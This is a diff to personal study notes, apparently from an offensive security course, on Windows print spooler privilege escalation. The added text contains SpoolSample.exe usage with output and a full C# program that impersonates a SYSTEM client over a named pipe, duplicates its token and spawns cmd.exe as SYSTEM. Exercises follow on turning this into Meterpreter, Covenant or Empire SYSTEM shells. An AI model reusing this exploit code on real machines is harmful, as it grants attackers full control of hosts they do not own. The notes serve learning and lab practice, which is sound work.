@@ -562,11 +562,176 @@ MSRPN cannot be called directly. Print spooler functionality resides in unmaange
 we use the spoolsample C# implementation by Lee Christensen- https://github.com/leechristensen/SpoolSample
 or the powershell scanner written by Le Toux - https://github.com/vletoux/SpoolerScanner
 
+Problem with spoolsample.exe - 
+
 The SpoolSample application was supposed to be used in AD setting.
 
 when we use spoolsample we must specify the name of the server to connect to and the name of the server we control 
 
 the print spooler service running as SYSTEM needs to contact the simulated print client but since they are on the same host, they in effect require the same default pipe name (pipe\spoolss) because of this we cannot use the same named pipe with required name easily
+
+after building SpoolSample.exe
+
+```
+C:\Users\WIN10RED\Documents\SpoolSample\SpoolSample\bin\Debug>SpoolSample.exe DESKTOP-ATB3U19 appsrv01\test
+[+] Converted DLL to shellcode
+[+] Executing RDI
+[+] Calling exported function
+TargetServer: \\DESKTOP-ATB3U19, CaptureServer: \\appsrv01\test
+```
+
+in combination with out impersonator. (cryptopals_exe and SpoolSample.exe)
+
+![](2022-08-28-19-10-19.png)
+
+if it had worked then we can use CreatePRocessWithTokenEx
+
+and DuplicateTokenEx to launch a command prompt
+
+full code for spooler lpe
+
+```c#
+using System;
+using System.Runtime.InteropServices;
+
+namespace console_csharp
+{
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct SID_AND_ATTRIBUTES
+    {
+        public IntPtr Sid;
+        public int Attributes;
+    }
+    public struct TOKEN_USER
+    {
+        public SID_AND_ATTRIBUTES User;
+    }
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode,
+        uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize,
+        uint nDefaultTimeOut, IntPtr lpSecurityAttributes);
+
+        [DllImport("kernel32.dll")]
+        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);
+
+        [DllImport("Advapi32.dll")]
+        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetCurrentThread();
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool
+        OpenAsSelf, out IntPtr TokenHandle);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass,
+        IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);
+
+        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);
+
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct STARTUPINFO
+        {
+            public Int32 cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags,
+        string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr
+        lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out
+        PROCESS_INFORMATION lpProcessInformation);
+        static void Main(string[] args)
+        {
+            if (args.Length == 0)
+            {
+                Console.WriteLine("Usage: console_sharp.exe pipename");
+                return;
+            }
+            string pipeName = args[0];
+            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
+            ConnectNamedPipe(hPipe, IntPtr.Zero);
+            ImpersonateNamedPipeClient(hPipe);
+
+            //confirming whether we got the correct pipe
+            IntPtr hToken;
+            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);
+
+            int TokenInfLength = 0;
+            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
+            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
+            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);
+
+            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
+            IntPtr pstr = IntPtr.Zero;
+            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
+            string sidstr = Marshal.PtrToStringAuto(pstr);
+            Console.WriteLine(@"Found sid {0}", sidstr);
+
+            // adding code for opening a privileged shell
+            IntPtr hSystemToken = IntPtr.Zero;
+            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
+
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+            STARTUPINFO si = new STARTUPINFO();
+            si.cb = Marshal.SizeOf(si);
+            CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe", 0,
+            IntPtr.Zero, null, ref si, out pi);
+
+
+        }
+    }
+}
+```
+
+further links mentioned
+
+rogue potato
+https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/
+
+rpc pipes - https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc787851(v=ws.10)?redirectedfrom=MSDN
+
+winrm - https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/
+
+### 12.2.2.1 Exercises
+1. Combine the code and verify the token impersonation.
+2. Use the C# code and combine it with previous tradecraft to obtain a Meterpreter, Covenant, 
+or Empire SYSTEM shell.
+3. Try to use the attack in the context of Local Service instead of Network Service
+
+
+# fun with incognito
+
 
 
 
